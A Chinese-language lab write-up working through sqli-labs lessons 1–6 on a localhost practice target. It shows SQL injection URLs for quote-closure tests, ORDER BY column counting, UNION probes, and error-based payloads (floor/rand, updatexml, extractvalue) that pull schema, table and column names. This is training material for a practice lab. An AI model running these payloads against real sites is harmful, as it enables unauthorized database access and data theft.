### sqli-labs实验

#### Less-1

注入点测试：

http://127.0.0.1:8088/sqli-labs/Less-1/?id=1' and '1'='1

![image-20210524154821414](C:\Users\19026\AppData\Roaming\Typora\typora-user-images\image-20210524154821414.png)

http://127.0.0.1:8088/sqli-labs/Less-1/?id=1' --+

![image-20210524154901112](C:\Users\19026\AppData\Roaming\Typora\typora-user-images\image-20210524154901112.png)

由此判断为字符型注入

http://127.0.0.1:8088/sqli-labs/Less-1/?id=1' order by 4 --+

![image-20210524153922499](C:\Users\19026\AppData\Roaming\Typora\typora-user-images\image-20210524153922499.png)

http://127.0.0.1:8088/sqli-labs/Less-1/?id=1' order by 3 --+

![image-20210524153936985](C:\Users\19026\AppData\Roaming\Typora\typora-user-images\image-20210524153936985.png)

对比可得字段数为3

http://127.0.0.1:8088/sqli-labs/Less-1/?id=-1' union select 1,2,3 --+

![image-20210524154952926](C:\Users\19026\AppData\Roaming\Typora\typora-user-images\image-20210524154952926.png)

存在union注入



#### Less-2

http://127.0.0.1:8088/sqli-labs/Less-2?id=1 and 1=1

未报错  故判断为数字型注入

http://127.0.0.1:8088/sqli-labs/Less-2?id=1 and 1=1 order by 3

未报错 可知查询字段数为3

http://127.0.0.1:8088/sqli-labs/Less-2?id=-1 union select 1,2,3

回显2,3  存在union注入



#### Less-3

http://127.0.0.1:8088/sqli-labs/Less-3/?id=1' --+

回显报错

http://127.0.0.1:8088/sqli-labs/Less-3/?id=1’） --+

未报错 可知为 ('') 闭合的字符型注入

http://127.0.0.1:8088/sqli-labs/Less-3/?id=1') order by 3 --+

未报错

http://127.0.0.1:8088/sqli-labs/Less-3/?id=1') order by 4 --+

报错可知查询字段数为3

http://127.0.0.1:8088/sqli-labs/Less-3/?id=-1') union select 1,2,3 --+

回显2,3  存在union注入



#### Less-4

http://127.0.0.1:8088/sqli-labs/Less-4/?id=1"--+

报错

http://127.0.0.1:8088/sqli-labs/Less-4/?id=1")--+

未报错 可见为 ("") 闭合的字符型注入

http://127.0.0.1:8088/sqli-labs/Less-4/?id=1") order by 3--+

http://127.0.0.1:8088/sqli-labs/Less-4/?id=1") order by 4--+

order by 判断字段数为3

http://127.0.0.1:8088/sqli-labs/Less-4/?id=-1") union select 1,2,3--+

回显2,3 存在union注入



#### Less-5

http://127.0.0.1:8088/sqli-labs/Less-5/?id=1'

![image-20210524162542365](C:\Users\19026\AppData\Roaming\Typora\typora-user-images\image-20210524162542365.png)

这里我们利用报错注入

(1). 通过floor报错

```
?id=1' and (select 1 from (select count(*),concat((SELECT schema_name FROM information_schema.schemata limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a) -- -
```

输出字符长度限制为64个字符

(2). 通过updatexml报错

```
?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) -- -
```

其最长输出32位

(3). 通过ExtractValue报错

```
and extractvalue(1, payload)
```

最长32位。

这一关我们采用第（1）种

查询数据库：

```
http://127.0.0.1:8088/sqli-labs/Less-5/?id=2' and (select 1 from (select count(*),concat(( select group_concat(schema_name) from information_schema.schemata),floor (rand(0)*2))x from information_schema.tables group by x)a)--+
```

![image-20210524164240374](C:\Users\19026\AppData\Roaming\Typora\typora-user-images\image-20210524164240374.png)

查询表：

```
http://127.0.0.1:8088/sqli-labs/Less-5/?id=2' and (select 1 from (select count(*),concat((select group_concat(table_name)from information_schema.tables where table_schema='challenges'),floor (rand(0)*2))x from information_schema.tables group by x)a)--+
```

![image-20210524164600279](C:\Users\19026\AppData\Roaming\Typora\typora-user-images\image-20210524164600279.png)查询字段：

```
http://127.0.0.1:8088/sqli-labs/Less-5/?id=2' and (select 1 from (select count(*),concat((select group_concat(column_name)from information_schema.columns where table_name='d3pws2p4k4'),floor (rand(0)*2))x from information_schema.tables group by x)a)--+
```

![image-20210524170049037](C:\Users\19026\AppData\Roaming\Typora\typora-user-images\image-20210524170049037.png)

#### Less-6

```SQL
?id=1
?id=1'
```

输入以上payload都正常回显，但是用双引号的时候就会报错

```SQL
?id=1"
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210603175944124.png)
由此推断为双引号包围，与less-5相似，可用报错注入

```SQL
?id=1" and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) -- -
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210603180233267.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNDU5NjAw,size_16,color_FFFFFF,t_70)

